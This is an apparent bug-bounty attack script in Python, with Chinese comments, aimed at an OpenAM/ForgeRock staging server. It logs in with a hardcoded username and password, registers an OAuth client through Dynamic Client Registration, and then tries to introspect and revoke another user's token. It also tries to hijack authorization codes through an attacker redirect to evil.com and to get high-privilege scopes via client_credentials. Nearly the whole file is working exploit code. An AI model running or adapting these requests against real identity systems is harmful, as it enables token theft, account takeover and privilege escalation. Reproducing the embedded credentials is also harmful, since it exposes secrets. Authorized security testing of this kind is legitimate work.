# -*- coding: utf-8 -*-
"""AIC 第四十六轮:DCR 带 Bearer token 注册 + 注册后经典 OAuth 漏洞验证
上轮信号:DCR 匿名 400 "Access Token not valid"——需要注册访问令牌。
本轮:
A. DCR + Authorization: Bearer <openid/fr:idm:/fr:iga:* token> 3 种 token 变体
B. 注册成功 -> 用新 client:
   B1. introspection 别人的 token(归属校验缺失 = 信息泄露)
   B2. revoke 别人的 token(越权撤销)
   B3. 自定义 redirect_uri 走 authorize(劫持 code)
   B4. client_credentials + 高权限 scope
预期结果表:
  成立 -> DCR 201 且 B1/B2 成功或 B3/B4 拿到越权 token
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def get_token(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    if 'code=' in loc:
        code = loc.split('code=')[1].split('&')[0]
        r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                    'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
        return r2.json().get('access_token')
    return None

print('\n=== A. DCR + Bearer token ===')
DCR = {
    'client_name': 'hunt-client-46', 'redirect_uris': [RU, 'https://evil.com/cb'],
    'grant_types': ['authorization_code', 'client_credentials'],
    'token_endpoint_auth_method': 'client_secret_post', 'application_type': 'web',
    'response_types': ['code', 'token'],
}
new_client = None
for name, sc in [('openid', 'openid'), ('idm', 'openid fr:idm:*'), ('iga', 'openid fr:iga:*')]:
    at = get_token(sc)
    if not at:
        print('[%s] token 获取失败' % name)
        continue
    r = S.post(BASE + '/am/oauth2/alpha/register', json=DCR,
               headers={'Authorization': 'Bearer ' + at}, timeout=15, verify=False)
    print('[%s-token] DCR -> %d %s' % (name, r.status_code, r.text[:250].replace('\n', ' ')))
    if r.status_code in (200, 201):
        try:
            j = r.json()
            print('  client_id=%s client_secret=%s' % (j.get('client_id'), (j.get('client_secret') or 'NONE')[:20]))
            new_client = j
            break
        except Exception:
            pass
    time.sleep(0.5)

if new_client:
    cid = new_client.get('client_id')
    csec = new_client.get('client_secret')
    print('\n=== B. 新 client 经典漏洞验证 ===')
    victim_at = get_token('openid')
    print('victim token:', victim_at[:40], '...')
    for auth in [{'client_id': cid, 'client_secret': csec},
                 {'client_id': cid}]:
        r = S.post(BASE + '/am/oauth2/alpha/introspect', data=dict({'token': victim_at}, **auth),
                   headers=FORM, timeout=12, verify=False)
        print('introspect(新client) -> %d %s' % (r.status_code, r.text[:250].replace('\n', ' ')))
        time.sleep(0.4)
    r = S.post(BASE + '/am/oauth2/alpha/token/revoke', data={'token': victim_at, 'client_id': cid,
                                                             'client_secret': csec},
               headers=FORM, timeout=12, verify=False)
    print('revoke(新client, 他人token) -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
    p = '/am/oauth2/realms/alpha/authorize?client_id=%s&response_type=code&redirect_uri=%s&scope=openid&state=t' % (
        quote(cid, safe=''), quote('https://evil.com/cb', safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    print('authorize(evil redirect) -> %d code=%s %s' % (r.status_code, 'Y' if 'code=' in loc else 'N', loc[:160]))
    if csec:
        for sc in ['openid', 'openid fr:idm:*', 'openid fr:iga:*', 'fr:idm:*']:
            r = S.post(TOKEN_EP, data={'grant_type': 'client_credentials', 'client_id': cid,
                                       'client_secret': csec, 'scope': sc},
                       headers=FORM, timeout=12, verify=False)
            print('cc scope=%-18s -> %d %s' % (sc, r.status_code, r.text[:180].replace('\n', ' ')))
            time.sleep(0.4)
